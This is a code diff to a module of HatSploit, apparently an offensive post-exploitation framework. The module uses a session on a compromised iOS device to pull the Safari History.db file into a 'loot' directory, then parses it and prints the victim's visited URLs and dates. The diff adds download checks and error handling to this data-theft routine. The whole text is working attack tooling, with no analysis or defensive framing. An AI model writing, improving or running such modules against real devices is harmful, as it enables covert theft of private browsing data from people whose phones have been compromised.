@@ -43,19 +43,23 @@ class HatSploitModule(Module, SessionTools, DBTools):
         session = self.get_session(session)
 
         if session:
-            session.download(
-                '/private/var/mobile/Library/Safari/History.db', config.path_config['loot_path'])
-            history = self.parse_safari_history(config.path_config['loot_path'] + 'History.db')
+            if session.download(
+                '/private/var/mobile/Library/Safari/History.db', config.path_config['loot_path']):
 
-            self.print_process("Parsing history database...")
+                self.print_process("Parsing history database...")
+                try:
+                    history = self.parse_safari_history(config.path_config['loot_path'] + 'History.db')
+                except Exception:
+                    self.print_error("Failed to parse history database!")
+                    return
 
-            headers = ('Date', 'URL')
-            history_data = []
+                headers = ('Date', 'URL')
+                history_data = []
 
-            for item in history:
-                history_data.append((item['date'], item['details']['url']))
+                for item in history:
+                    history_data.append((item['date'], item['details']['url']))
 
-            if history_data:
-                self.print_table("History", headers, *history_data)
-            else:
-                self.print_warning("No history available on device.")
+                if history_data:
+                    self.print_table("History", headers, *history_data)
+                else:
+                    self.print_warning("No history available on device.")
